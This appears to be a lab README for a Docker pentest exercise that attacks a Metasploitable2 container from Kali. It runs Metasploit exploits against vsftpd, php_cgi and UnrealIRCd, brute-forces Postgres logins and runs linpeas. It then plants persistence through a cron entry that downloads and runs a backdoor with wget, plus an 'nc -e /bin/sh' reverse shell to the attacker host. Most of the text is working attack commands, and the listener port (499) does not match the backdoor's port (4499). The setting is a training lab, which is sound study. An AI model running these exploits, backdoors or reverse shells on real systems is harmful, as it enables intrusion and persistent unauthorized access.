
## Setup 

```bash
make up
make ps
```

```bash
make logs container=meta2
make logs container=kali 
```

```bash
make access container=meta2
make access container=kali
```

In each container, run:

```bash
ifconfig # you should see 172.20.0.3 for the attacker and 172.20.0.2 for the victim 
```

From kali, run:

```bash
nmap -F 172.20.0.2
```

## Penetration

### Privilege Escalation

From kali:

```bash
nmap -sV -p 21 172.20.0.2
```

```bash
msfconsole
search vsftpd
#   1  exploit/unix/ftp/vsftpd_234_backdoor
use 1
set rhosts 172.20.0.2
set rport 21
exploit
```

Now to check previliges, directly type:

```bash
whoami #root
```

### Password brute force
From kali:
```bash
msfconsole
search postgres
#   9   auxiliary/scanner/postgres/postgres_login
use 9
set rhosts 172.20.0.2
set STOP_ON_SUCCESS true
run
```

## Stop the containers

```bash
make down
```


## Demo
From kali:

We will run the script by exploiting a php vulnerability but from a non-privileged user
```bash
msfconsole
search php_cgi
use 0
set rhosts 172.20.0.2
exploit 

# we get a meterpreter session
upload linpeas_linux_amd64 . # from here, we upload the linpeas script to the victim
shell # we open a shell in victim
ls # check file was uploaded successfully
chmod 777 linpeas_linux_amd64
./linpeas_linux_amd64 -a > out.txt
exit
```
From meterpreter:
```bash
download out.txt
bg # Go back to msfconsole
```

From kali terminal:
```bash
less -r out.txt # Open linpeas file, search for /irc in the file
```

Go back to the session:
```bash
sessions -i* # list sessions
sessions -i 1 # go back to the first session
```


From msfconsole:
```bash
search unrealirc
use 0
set RHOSTS 172.20.0.2
set LHOST 172.20.0.3
set payload cmd/unix/reverse
exploit
# this creates a shell
whoami # root
shell
```

From root shell:
```bash
# Leaving a backdoor
echo '* * * * * root cd /tmp; wget 172.20.0.3/backdoor && chmod +x backdoor && ./backdoor' > /etc/cron.d/backdoor
```

From another kali terminal:
```bash
# write a backdoor script
echo 'nc -e /bin/sh 172.20.0.3 4499' > backdoor

# serve script using http server
python3 -m http.server 80

```

From another kali terminal:
```bash
nc -nlvp 499
# wait
```

Go back to the session:
```bash
sessions -i* # list sessions
sessions -i 1 # go back to the first session
```
